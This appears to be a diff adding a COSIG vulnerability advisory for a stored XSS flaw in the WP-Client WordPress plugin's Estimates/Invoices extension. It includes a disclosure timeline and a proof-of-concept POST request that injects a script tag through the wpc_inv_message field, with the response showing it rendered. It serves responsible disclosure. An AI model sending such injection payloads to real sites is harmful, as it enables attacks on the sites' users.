@@ -1,0 +1,66 @@
+#####################################################################################
+ 
+Application: WP-Client
+ 
+Version: 3.8.7
+ 
+Author: Pier-Luc Maltais from COSIG
+ 
+Twitter: @COSIG_
+ 
+#####################################################################################
+ 
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) POC
+
+#####################################################################################
+ 
+===============
+1) Introduction
+===============
+One plugin configures multiple areas of your WordPress installation and allows the 
+site Administrator to easily create new Client Areas, Client Management Portals, 
+Client Estimates & Invoices, Client File Upload Areas, or Private Staff Pages on the 
+site by entering  just a few data fields. Additionally, clients can upload/download 
+secure files. (https://wp-client.com/)
+
+ 
+============================
+2) Report Timeline
+============================
+12/11/2015 - Found the vulnerability
+12/11/2015 - Ticket opened
+20/11/2015 - Plugin extension Estimates/Invoices updated (v1.5.2)
+24/11/2015 - Public disclosure
+ 
+ 
+============================
+3) Technical details
+============================
+WP-Client is vulnerable to a stored XSS attack in the Request Estimate page. The 
+extension affected is Estimates/Invoices v1.5.1.
+
+
+============================
+4) POC
+============================
+Request : 
+
+POST /portal/request-estimate/ HTTP/1.1
+[...]
+wpc_data%5Baction%5D=request&wpc_data%5Btitle%5D=Request+Estimate+from+2015-11-12&wpc_data%5Bitems%5D%5B%7Bnum_items%7D%5D%5Bname%5D=&wpc_data%5Bitems%5D%5B%7Bnum_items%7D%5D%5Bdescription%5D=&wpc_data%5Bitems%5D%5B%7Bnum_items%7D%5D%5Bquantity%5D=1&wpc_data%5Bitems%5D%5B%7Bnum_items%7D%5D%5Bprice%5D=&wpc_data%5Bwpc_inv_message%5D=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+ 
+Response :
+
+[...]
+<div class="wpc_clear"></div>
+    <span>Comments:</span><br>
+	<table id="wpc_inv_table_request_notes" style="width: 100%;">
+		<tr bgcolor="E0E0E0">
+			<td><b>client:</b></td>
+			<td><script>alert(1)</script>
+[...]
+
+#####################################################################################
